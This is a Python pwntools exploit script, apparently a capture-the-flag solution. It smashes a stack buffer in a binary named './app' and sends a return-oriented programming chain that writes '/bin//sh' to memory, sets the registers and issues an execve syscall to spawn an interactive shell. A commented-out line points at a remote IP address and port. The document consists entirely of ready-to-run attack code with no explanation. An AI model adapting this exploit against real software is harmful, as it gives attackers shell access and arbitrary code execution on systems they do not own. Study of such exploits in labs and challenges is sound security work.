from pwn import *
from struct import pack

#r = remote("34.82.101.212", 10011) #process("./app")
r = process("./app")
p = 'A' * 0x108

p += pack('<Q', 0x0000000000410083) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415234) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f011) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410083) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444790) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f011) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000410083) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449455) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444790) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474460) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474a05) # syscall ; ret

ui.pause()
r.sendline(p)
r.interactive()
